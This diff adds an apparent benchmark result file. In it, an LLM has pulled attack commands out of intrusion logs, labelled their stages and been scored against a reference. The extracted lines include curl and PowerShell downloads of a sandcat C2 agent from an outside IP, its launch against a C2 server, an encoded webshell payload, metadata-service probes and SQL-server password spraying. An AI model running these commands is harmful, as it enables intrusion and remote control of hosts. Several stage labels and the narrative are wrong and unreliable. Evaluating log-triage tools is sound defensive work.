@@ -1,0 +1,103 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c /usr/local/hostguard/bin/curl -k --connect-timeout 10 \"https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+PCVDbGFzc0xvYWRlcntVJT48JShDbGFzc0xvYWRlciBjKSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGljJT48JUNsYXNzJT48JWcoYnl0ZSU+PCVbLyoqL11iKXtyZXR1cm4lPjwlc3VwZXIuJT48JWRlZmluZUNsYXNzJT48JSglPjwlYiU+PCUsMCoxLGIuJT48JWxlbmd0aCk7fX0lPjwlISU+PCVpZiU+PCUocmVxdWVzdC4lPjwlZ2V0TWV0aG9kKCU+PCUpLiU+PCVlcXVhbHMoJT48JSJQT1NUIiU+PCUpKSU+PCV7U3RyaW5nJT48JWs9ImU0NWUzMjlmZWI1ZDkyNWIiOyU+PCVzZXNzaW9...",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wget --version > /dev/null;if [ $? -eq 0 ];then wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header=Metadata:true -O - http://169.254.169.254/metadata/instance?api-version=2019-03-11;else curl --version > /dev/null;if [ $? -eq 0 ];then curl --connect-timeout 7 -s --header=Metadata:true http://169.254.169.254/metadata/instance?api-version=2019-03-11;fi;fi;exit 0",
+        "stage": "Discovery"
+      },
+      {
+        "command": "wget --version",
+        "stage": "Discovery"
+      },
+      {
+        "command": "wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header=Metadata:true -O - http://169.254.169.254/metadata/instance?api-version=2019-03-11",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Persistence"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\Users\\Public\\sandcat.exe\";$wc.DownloadFi..., ",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attackers gained an initial access through the use of vulnerability exploit tools such as curl and wget for downloading malware like sandcat-linux. The attackers maintained persistence using techniques like creating backdoors in system services. They accessed sensitive information using SQL injection attacks against various databases. Furthermore, they obtained credentials for user accounts named 'sa', exploited their privileges by accessing sensitive information and finally established communication channels using their C2 servers.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 13606,
+      "completion_tokens": 1375,
+      "total_tokens": 14981,
+      "wall_clock_s": 18.134,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.46153846153846156,
+      "recall": 0.6666666666666666,
+      "f1": 0.5454545454545455,
+      "tp": 6,
+      "fp": 7,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.15384615384615385,
+      "recall": 0.25,
+      "f1": 0.1904761904761905,
+      "tp": 2,
+      "fp": 11,
+      "fn": 6,
+      "recall_partial": 0.35714285714285715
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 13606,
+      "completion_tokens": 1375,
+      "total_tokens": 14981,
+      "wall_clock_s": 18.134,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
